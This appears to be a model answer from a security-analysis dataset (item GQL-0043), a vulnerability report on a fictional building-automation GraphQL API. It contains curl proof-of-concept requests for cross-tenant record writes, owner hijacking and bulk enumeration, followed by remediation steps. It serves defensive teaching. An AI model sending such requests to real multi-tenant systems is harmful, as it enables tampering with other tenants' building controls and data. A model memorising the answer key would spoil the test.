# Expected Response

## System
- Domain: Smart Home / Building Automation
- System: NeoBuild BAS Platform
- Example ID: GQL-0043

## Priority Findings

### Finding 1: Session Scope Escalation via updateResource — Single User Escalates Own Session to Write Cross-Tenant BAS Records (Pattern 10.2)
**Severity:** Critical
**Category:** BOLA / Parameter Escalation

**Summary:**
A single authenticated user from `tenant-2ba6` extended their session's scope beyond their authorized boundary by substituting three parameters in a single mutation: `id: "R-2043"` (a building automation record belonging to `tenant-094f`), `status: "approved"`, and `ownerId: "attacker-2ba6094f"`. No privilege escalation or account takeover was required — one valid JWT was sufficient. The server returned `200 OK` with `tenant-094f` data, confirming the mutation succeeded. In a BAS (Building Automation System) context, writing `status: "approved"` to another tenant's building control record could activate or disable HVAC, access control, or safety systems.

**Evidence from HAR:**
- Request: `POST https://api.neobuild-bas-platfor.example.com/graphql` (2026-04-13T16:22:34Z, 181 ms, wait: 50 ms)
- JWT `x-tenant-id`: `tenant-2ba6` — single attacker token
- Mutation payload: `updateResource(id: "R-2043", input: {status: "approved", ownerId: "attacker-2ba6094f"})` — three parameters escalated
- Response HTTP status: `200 OK` — mutation succeeded, no authorization error
- Response `tenantId`: `tenant-094f` — victim's BAS record updated
- Response `ownerId`: `other-user-2ba6094f`
- Response `sensitiveField`: `CONFIDENTIAL-2ba6094f`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-2ba6094f`
- `timings.wait`: 50 ms — consistent with Redis cache read of cross-tenant record (§2.0: cache keyed by `resourceId` only)

**Root Cause (§4.0 RISK-GQL-043 + §5.0):** The `updateResource` resolver fetches by `resourceId` without asserting `WHERE tenant_id = $jwt.tenantId`. The `ResourceInput` accepts `ownerId` as a mass-assignable field. §5.0 (Pattern 10.2): "The resolver handling `resourceId` does not enforce ownership or tenancy boundaries" — a single session can escalate to any resource by parameter substitution.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-043 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 10.2 | Parameter escalation — own session scope extension |
| context.txt §2.0 | Caching | "Redis cache keyed by `resourceId` — no user dimension" |
| HAR entry | request.postData | `updateResource(id: "R-2043", input: {status: "approved", ownerId: "attacker-2ba6094f"})` |
| HAR entry | response.content | `tenantId: "tenant-094f"`, `200 OK` — parameter escalation confirmed |
| HAR entry | timings.wait | 50 ms — Redis cache hit on cross-tenant record |

---

### Finding 2: Cross-Tenant Bulk Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Confirm single-user baseline (own session scope)
```bash
curl -s -X POST https://api.neobuild-bas-platfor.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2ba6" \
  -d '{"query": "mutation { updateResource(id: \"R-2ba6-001\", input: {status: \"pending\"}) { resourceId status tenantId } }"}'
```
**Expected:** Updates own-tenant BAS record; `tenantId: "tenant-2ba6"`.

### Step 2 — Parameter escalation: write to cross-tenant BAS record (HAR attack)
```bash
curl -s -X POST https://api.neobuild-bas-platfor.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2ba6" \
  -d '{"query": "mutation { updateResource(id: \"R-2043\", input: {status: \"approved\", ownerId: \"attacker-2ba6094f\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `R-2043` (belonging to `tenant-094f`) updated to `status: "approved"`, `ownerId` hijacked to `attacker-2ba6094f` — session scope escalated to cross-tenant write. Wait time ~50 ms confirms Redis cache served cross-tenant record.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"updateResource": null}}`.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.neobuild-bas-platfor.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-2ba6" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2043\", \"R-094f-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns BAS records from `tenant-094f`.
**Secure outcome:** Only own-tenant records returned; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 2**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "updateResource": null }
}
```

## Remediation
1. **Resolver-level tenant guard on updateResource:** Before applying the update, verify `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`. Reject with FORBIDDEN if the record belongs to a different tenant.
2. **Strip ownerId from ResourceInput:** `ownerId` must NOT be accepted from the client — derive from JWT's `sub` only. This eliminates the ownership hijack vector.
3. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
4. **Include tenantId in Redis cache key:** Change from `resourceId` to `resourceId:tenantId` (§2.0) to prevent cross-tenant cache reads.
5. **Automated regression tests:** Assert `tenant-2ba6` calling `updateResource(id: "R-2043", ...)` on a `tenant-094f` record receives FORBIDDEN.
